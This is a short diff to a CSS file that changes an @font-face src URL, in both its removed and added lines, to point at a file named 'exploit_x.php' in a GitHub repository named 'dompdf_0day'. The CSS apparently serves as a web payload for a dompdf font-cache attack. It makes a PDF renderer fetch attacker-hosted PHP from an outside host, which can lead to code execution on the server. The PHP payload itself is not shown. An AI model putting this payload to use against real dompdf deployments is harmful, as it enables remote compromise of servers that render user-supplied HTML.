@@ -1,6 +1,6 @@
 @font-face {
     font-family:'fontxx';
-    src:url('https://github.com/veath1/dompdf_0day/raw/main/exploit_x.php');
+    src:url('https://raw.githubusercontent.com/veath1/dompdf_0day/main/exploit_x.php');
     font-weight:'bold';
     font-style:'bold';
   }
